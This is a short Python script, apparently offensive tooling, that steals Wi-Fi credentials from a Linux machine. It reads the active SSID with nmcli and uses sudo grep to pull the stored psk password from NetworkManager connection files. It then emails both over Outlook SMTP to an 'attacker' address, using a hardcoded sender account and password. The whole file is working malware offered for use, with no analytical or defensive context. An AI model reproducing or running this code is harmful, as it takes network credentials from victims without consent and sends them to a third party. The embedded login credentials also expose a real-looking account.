import subprocess
import time

def send_logs():
    with open("/usr/bin/config.txt", "r") as cfile:
        config = cfile.read()
        config = config.split("|")
    if config[0] != "empty":
    	dest_email = config[0]
    else:
        dest_email = input("Email Atacante >> ")        
    cfile.close()
    machine_name = config[1]
    usuario = config[2]
    usuario = usuario.replace('\n','')
    cfile.close()

    logs = "SSID : "+resultado+"  |  Password : "+conect

    import smtplib
    from email.mime.text import MIMEText

    msg = MIMEText(logs)

    msg['Subject'] = "Wifi logs"
    msg['From'] = 'sendregistros@outlook.com'
    msg['To'] = dest_email

    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        
    server.starttls()
    server.login("sendregistros@outlook.com", "@3nv14d0rd3r4gi1str0s_1090230@")
    server.sendmail("sendregistros@outlook.com", dest_email, msg.as_string())
    print("Successfully sent email")

# SSID and PWD
def get_wifi():
    global resultado
    global conect

    resultado=str(subprocess.check_output("nmcli connection show", shell=True))
    resultado = resultado.split('DEVICE ')[1].split('wifi')[0][2:].split(' ')[0]
    conect=str(subprocess.check_output("sudo grep psk= /etc/NetworkManager/system-connections/"+resultado+".nmconnection", shell=True))[6:][:-3]
    send_logs()

get_wifi()